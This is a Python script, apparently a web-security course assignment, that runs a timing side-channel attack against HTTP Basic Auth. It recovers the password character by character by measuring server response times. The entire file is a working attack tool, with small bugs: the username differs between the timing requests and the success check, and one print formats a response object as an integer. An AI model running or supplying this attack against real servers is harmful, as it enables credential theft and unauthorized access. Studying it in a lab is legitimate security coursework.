"""
CS510 Web Security Program 2
Andrew Rogers
Fall 2017
"""

import sys
import string
import time
import requests
from requests.auth import HTTPBasicAuth
from operator import itemgetter


def run_test(payload, url):
    """
    Records timing data for an individual time attack event
    :param payload: the password string to be tested
    :param url: the target website
    :return: the time in float to complete the attack event
    """
    total_time = 0
    while total_time <= 0:  # error checking to prevent timing errors
        pre_time = time.time()
        requests.get(url, auth=HTTPBasicAuth('hacker', payload))
        total_time = time.time() - pre_time
    return total_time


def range_testing(poss_chars, known_login, known_pass, url):
    """
    Builds a list of test results and sorts from the longest duration
    to shortest over a range of provided characters
    :param poss_chars: this is the range of characters to be considered
    :param known_pass: The previously derived character to be built upon
    :param url: the target url for the attack
    :return: A list of the top ten (in order) most likely characters
    """
    test_list = []
    for test_char in poss_chars:
        load = known_pass + test_char
        print("The current test is %s" % load)
        total_time = run_test(load, url)
        print("Time for %s was %f" % (load, total_time))
        test_list.append((total_time, test_char))
    test_list.sort(key=itemgetter(0), reverse=True)  # sorting the list
    result_list = []
    for pass_char in test_list[:10]:
        result_list.append(pass_char[1])
    return result_list


def check_char(known_login, known_pass, url):
    """
    Organizes the test of all alphanumeric characters and then runs a test
    of the top ten results from the 1st test to provide error checking

    :param known_login: A string containing the correct login characters
    already found so far.
    :param known_pass: A string containing the correct password characters
    already found so far.
    :param url: The website for the basic auth test
    :return: the list of known characters with a new correct character
    attached.
    """
    if known_login:
        test_login = known_login  # test_load the test string for comparison
    else:
        test_login = ""
    if known_pass:
        test_pass = known_pass  # test_load the test string for comparison
    else:
        test_pass = ""
    sample_range = string.ascii_letters + string.digits  # building range of all alphanumeric
    top_ten = range_testing(sample_range, test_login, test_pass, url)
    print("Testing the top 10 results")
    final_test = range_testing(top_ten, test_login, test_pass, url)
    print("The slowest character was %s" % final_test[0])
    return known_pass + final_test[0]


def main():
    # Command line argument exception handling
    if len(sys.argv) < 2:
        print("You failed to provide a target URL on the command line!")
        sys.exit(1)  # abort because of error
    test_url = sys.argv[1]
    if test_url[:7].lower() != "http://":
        print("ERROR:: Expecting URL beginning with \'http://\' ")
        sys.exit(1)  # abort because of error
    url_status = requests.get(test_url)  # validate the url
    if url_status.status_code != 401:
        print("URL in error or without authentication with status code %d" % url_status)

    # Beginning the actual attack
    known_login = "" # This is holder of the username as it is being built
    known_pass = ""  # This is holder of the password as it is being built
    while requests.get(test_url, auth=HTTPBasicAuth(known_login, known_pass)).status_code == 401:
        known_pass = check_char(known_login, known_pass, test_url)

    print("\n\nFinished! \n The password is %s" % known_pass)


if __name__ == '__main__':
    main()
